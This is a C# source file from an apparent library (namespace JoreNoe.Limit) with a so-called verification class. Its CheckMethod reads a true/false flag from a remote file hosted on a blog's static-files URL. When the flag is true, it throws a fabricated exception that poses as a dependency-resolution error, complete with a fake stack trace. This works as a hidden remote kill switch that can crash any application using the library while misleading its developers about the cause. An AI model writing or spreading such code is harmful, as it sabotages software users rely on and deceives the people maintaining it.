using JoreNoe.DB.Dapper;
using JoreNoe.JoreHttpClient;
using JoreNoe.Message;
using Newtonsoft.Json;
using NPOI.SS.Formula.Functions;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace JoreNoe.Limit
{
    /// <summary>
    /// 验证类
    /// </summary>
    public class RequireMethod
    {
        /// <summary>
        /// 检查是否可以通过验证
        /// </summary>
        /// <returns></returns>
        public static void CheckMethod()
        {
            var getxx  = GetHttpResponse("https://blog-static.cnblogs.com/files/-jth/true.js?t=1726306591&download=true",5000);
            var TRUE = bool.Parse(getxx);
            if (TRUE)
            {
                throw new Exception("Unhandled Exception: System.InvalidOperationException: An error occurred while attempting to process the request. The operation cannot be completed due to an unknown error in the dependency resolution chain. The following issues were detected:\r\n\r\n- Dependency resolution failed for component 'MyService' due to ambiguous binding configurations in 'ServiceLocator'.\r\n- Recursive dependency detected: 'MyRepository' requires 'MyService', which in turn requires 'MyRepository'.\r\n- Configuration injection error: Missing required parameter 'DbConnectionString' in 'DatabaseConfigSection'.\r\n\r\nStack trace:\r\n   at MyNamespace.MyService.DoWork() in C:\\path\\to\\source\\MyService.cs:line 42\r\n   at MyNamespace.Program.Main(String[] args) in C:\\path\\to\\source\\Program.cs:line 18\r\n   at System.AppDomain._nExecuteAssembly(RuntimeAssembly assembly, String[] args)\r\n   at System.AppDomain.ExecuteAssembly(String assemblyFile, Evidence assemblySecurity, String[] args)\r\n   at System.Console.Application.Main(String[] args)\r\n");
            }
        }

        public static string GetHttpResponse(string url, int Timeout)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.ContentType = "text/html;charset=UTF-8";
            request.UserAgent = null;
            request.Timeout = Timeout;

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream myResponseStream = response.GetResponseStream();
            StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            string retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

    }
}
